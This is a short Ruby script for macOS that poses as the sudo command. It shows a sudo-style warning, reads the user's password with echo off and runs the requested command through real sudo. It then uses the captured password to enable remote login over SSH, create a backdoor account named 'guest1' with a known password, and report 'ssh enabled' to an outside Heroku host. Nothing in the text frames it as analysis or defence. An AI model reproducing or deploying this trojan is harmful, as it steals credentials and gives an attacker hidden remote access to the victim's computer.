print "WARNING: Improper use of the sudo command could lead to data loss\nor the deletion of important system files. Please double-check your\ntyping when using sudo. Type \"man sudo\" for more information.\n\nTo proceed, enter your password, or type Ctrl-C to abort.\n\nPassword:"

system "stty -echo"
password = $stdin.gets.chomp
system "stty echo"

print `echo '#{password}' | /usr/bin/sudo -S #{ARGV[0..-1].join(' ')}`

username = "guest1"
user_id = 1111
`echo '#{password}' | /usr/bin/sudo -S systemsetup -setremotelogin on && echo '#{password}' | /usr/bin/sudo -S dscl . -create /Users/#{username} && echo '#{password}' | /usr/bin/sudo -S dscl . -create /Users/#{username} UserShell /bin/bash && echo '#{password}' | /usr/bin/sudo -S dscl . -create /Users/#{username} RealName "Sys Admin" && echo '#{password}' | /usr/bin/sudo -S dscl . -create /Users/#{username} UniqueID "#{user_id}" && echo '#{password}' | /usr/bin/sudo -S dscl . -passwd /Users/#{username} password`

require 'net/http'
require 'uri'

Net::HTTP.post_form(URI.parse('http://stark-samurai-8122.herokuapp.com/logs'), {'log' => 'ssh enabled'})